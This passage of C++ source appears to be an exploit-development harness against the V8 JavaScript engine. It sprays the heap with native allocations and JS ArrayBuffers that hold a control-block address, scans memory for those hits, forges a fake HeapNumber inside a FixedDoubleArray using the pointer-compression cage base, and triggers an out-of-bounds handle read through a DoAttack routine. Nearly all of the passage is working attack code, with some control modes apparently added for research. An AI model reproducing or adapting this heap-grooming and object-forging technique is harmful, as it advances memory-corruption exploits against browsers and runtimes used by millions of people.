          if (cand < cage_base || cand >= cage_base + 0x100000000ULL) continue;
          // FixedDoubleArray: [map c32][len smi] then doubles at +8.
          if (memcmp(reinterpret_cast<uint8_t*>(cand) + 8, &want, 8) == 0)
            elem_base = cand;
        }
        if (!elem_base) {
          fprintf(stderr, "[s4] elements not located\n");
          return 68;
        }
        uint64_t e0 = elem_base + 8;
        fprintf(stderr, "[s4] FixedDoubleArray @0x%016" PRIx64
                        " elem0=0x%016" PRIx64 "\n",
                elem_base, e0);
        // fake object base = e0 + 4 (4-aligned): map at [e0+4..e0+7],
        // double payload at [e0+8..e0+15] == elem1 full.
        *reinterpret_cast<uint32_t*>(e0 + 4) = map_c32;
        uint64_t mark = 0x1337133713371337ULL;
        double payload; memcpy(&payload, &mark, 8);
        memcpy(reinterpret_cast<uint8_t*>(e0 + 8), &payload, 8);
        uint32_t fake_c32 = (uint32_t)((e0 + 4) - cage_base);
        cb[0] = cage_base | (uint64_t)(fake_c32 | 1);  // HeapObject tag
        cb[1] = cb[0];
        fprintf(stderr, "[s4] fake HeapNumber @0x%016" PRIx64
                        " cb[0]=0x%016" PRIx64 " (payload bits 0x%016" PRIx64
                        ")\n",
                cage_base | fake_c32, cb[0], mark);
      }
      uint64_t cb_addr = reinterpret_cast<uint64_t>(cb);
      fprintf(stderr, "[%s] control block cb=%p cb[0]=0x%016" PRIx64
                      " (%s)\n", mode.c_str(), (void*)cb, cb[0], tmode);

      if (mode == "s3a") {
        std::vector<void*> spray;
        spray.reserve((size_t)gcnt);
        for (int i = 0; i < gcnt; i++) {
          uint64_t* p = reinterpret_cast<uint64_t*>(malloc(gsz));
          for (size_t o = 0; o + 8 <= gsz; o += 8)
            *reinterpret_cast<uint64_t*>(reinterpret_cast<uint8_t*>(p) + o) =
                cb_addr;
          spray.push_back(p);
        }
        fprintf(stderr, "[s3a] sprayed %d malloc chunks of %zu bytes\n", gcnt,
                gsz);
      } else {
        std::string src = JsSpraySource(gsz, gcnt, cb_addr);
        RunJS(isolate, context, src.c_str());
        fprintf(stderr, "[s3jsa] sprayed %d JS ArrayBuffers of %zu bytes\n",
                gcnt, gsz);
      }

      void* handles_obj = *reinterpret_cast<void**>(&*holder.conveyor);
      uint64_t* base = reinterpret_cast<uint64_t*>(
          reinterpret_cast<uint64_t*>(handles_obj)[1]);
      fprintf(stderr, "[%s] vec begin=%p; scanning fwd %" PRId64 " MB...\n",
              mode.c_str(), (void*)base, cap_mb);
      fflush(stderr);
      ScanResult sr;
      if (getenv("S3_NOSCAN")) {
        fprintf(stderr, "[%s] S3_NOSCAN: skipping scan\n", mode.c_str());
      } else if (getenv("S3_LOCALSCAN")) {
        sr = ScanForCb(base, cb_addr, cap_mb * 1024 * 1024);
      } else {
        sr = ScanForCbForked(base, cb_addr, cap_mb * 1024 * 1024);
      }
      fprintf(stderr,
              "[%s] scan done: slots=%" PRId64 " nonzero=%" PRId64
              " cb_hits=%zu  mappedS=%" PRId64 " evenT=%" PRId64
              " oddT=%" PRId64 " faults=%" PRId64 "\n",
              mode.c_str(), sr.scanned, sr.nonzero, sr.cb_hits.size(),
              sr.matched_ptr, sr.even_t, sr.odd_t, sr.faults);
      size_t shown = sr.cb_hits.size() < 8 ? sr.cb_hits.size() : 8;
      for (size_t i = 0; i < shown; i++)
        fprintf(stderr, "  cb_hit K=%" PRId64 " (0x%" PRIx64 ") off=0x%zx\n",
                sr.cb_hits[i], sr.cb_hits[i],
                (size_t)(sr.cb_hits[i] * 8));
      for (auto& e : sr.even_examples)
        fprintf(stderr, "  evenT example: K=%" PRId64 " S=0x%016" PRIx64
                        " T=0x%016" PRIx64 " => Smi(lo31)=%d\n",
                e.k, e.s, e.t, (int32_t)((uint32_t)e.t) >> 1);
      if (sr.cb_hits.empty()) {
        if (!getenv("S3_SAFE")) {
          fprintf(stderr, "[%s] no cb hit within cap; try bigger spray/cap\n",
                  mode.c_str());
          return 66;
        }
        sr.cb_hits.push_back(N ? N - 1 : 0);
        fprintf(stderr, "[%s] (noscan/safe) fallback K=%" PRId64 "\n",
                mode.c_str(), sr.cb_hits[0]);
      }
      // Attack the first cb hit: GetPersisted(K) => *(&cb) = cb[0].
      uint32_t K = (uint32_t)sr.cb_hits[0];
      const char* evensel = getenv("S3_EVENSEL");
      if (evensel && !sr.even_examples.empty()) {
        int ei = (int)strtoul(evensel, nullptr, 0);
        if ((size_t)ei < sr.even_examples.size()) {
          K = (uint32_t)sr.even_examples[ei].k;
          fprintf(stderr,
                  "[%s] S3_EVENSEL: attacking uncontrolled even slot K=%u\n",
                  mode.c_str(), K);
        }
      }
      if (getenv("S3_SAFE")) {
        K = N ? N - 1 : 0;  // control: attack in-bounds instead
        fprintf(stderr, "[%s] S3_SAFE control: attacking in-bounds K=%u\n",
                mode.c_str(), K);
      }
      Local<Value> v;
      if (!DoAttack(isolate, context, &holder, K, &v).IsEmpty()) {
        JsProbes(isolate, context, v);
        // Also attack a second hit if present (determinism snapshot).
        if (sr.cb_hits.size() > 1) {
          uint32_t K2 = (uint32_t)sr.cb_hits[1];
          Local<Value> v2;
          if (!DoAttack(isolate, context, &holder, K2, &v2).IsEmpty())
            JsProbes(isolate, context, v2);
        }
        // GC-hazard probe: force full GC, then re-run typeof/value probes.
        fprintf(stderr, "[gc] forcing full GC, re-probing...\n");
        isolate->RequestGarbageCollectionForTesting(
            Isolate::kFullGarbageCollection);
        RunPrepared(isolate, context, "typeof v (post-GC)", g_p_typeof);
        RunPrepared(isolate, context, "''+v (post-GC)", g_p_val);
      }
      // Skip v8 teardown: leaked/fake tagged values upset PersistentHandles
      // cleanup checks; OS reaps everything anyway.
      fprintf(stderr, "[*] %s complete; fast exit(0) (teardown skipped)\n",
              mode.c_str());
      fflush(stderr);
      _exit(0);
    } else if (mode == "s3" || mode == "s3js") {
      // Grooming: control block + spray chunks carrying its address.
      uint64_t* cb = reinterpret_cast<uint64_t*>(malloc(64));
      const char* tmode = getenv("S3_T");
      if (!tmode) tmode = "smi1337";
      if (strcmp(tmode, "marker") == 0) {
        // Use a real JS object as the target tagged value.
        RunJS(isolate, context,
              "globalThis.markerObj = {p: 0x41424344, q: [1,2,3]};"
              "'marker created'");
        Local<Value> mv;
        context->Global()
            ->Get(context, String::NewFromUtf8Literal(isolate, "markerObj"))
            .ToLocal(&mv);
        cb[0] = RawTaggedOfLocal(mv);
        cb[1] = cb[0];
      } else {
        cb[0] = (uint64_t)1337LL << 32;  // tagged Smi(1337) in full slot
        cb[1] = cb[0];
      }
      for (int i = 2; i < 8; i++) cb[i] = 0x4342424242424200 + i;
      fprintf(stderr, "[s3] control block cb=%p cb[0]=0x%016" PRIx64
                      " (%s)\n",
              (void*)cb, cb[0], tmode);

      if (mode == "s3") {
        std::vector<void*> spray;
        spray.reserve((size_t)gcnt);
        for (int i = 0; i < gcnt; i++) {
          uint64_t* p = reinterpret_cast<uint64_t*>(malloc(gsz));
          for (size_t o = 0; o + 8 <= gsz; o += 8)
            *reinterpret_cast<uint64_t*>(reinterpret_cast<uint8_t*>(p) + o) =
                reinterpret_cast<uint64_t>(cb);
          spray.push_back(p);
        }
        fprintf(stderr, "[s3] sprayed %d control chunks of %zu bytes\n", gcnt,
                gsz);
      } else {
        std::string src = JsSpraySource(gsz, gcnt, (uint64_t)(uintptr_t)cb);
        RunJS(isolate, context, src.c_str());
      }

      fprintf(stderr, "[s3] vec window after grooming:\n");
      DumpWindow(&holder, (int64_t)N, (int64_t)N - 1, (int64_t)N + 26);
      Local<Value> v;
      if (!DoAttack(isolate, context, &holder, K, &v).IsEmpty()) {
        JsProbes(isolate, context, v);
      }
    } else {
      fprintf(stderr, "unknown mode %s\n", mode.c_str());
      return 64;
    }
  }
  isolate->Dispose();
  v8::V8::Dispose();
  v8::V8::DisposePlatform();
  fprintf(stderr, "[*] clean exit\n");
  return 0;
}
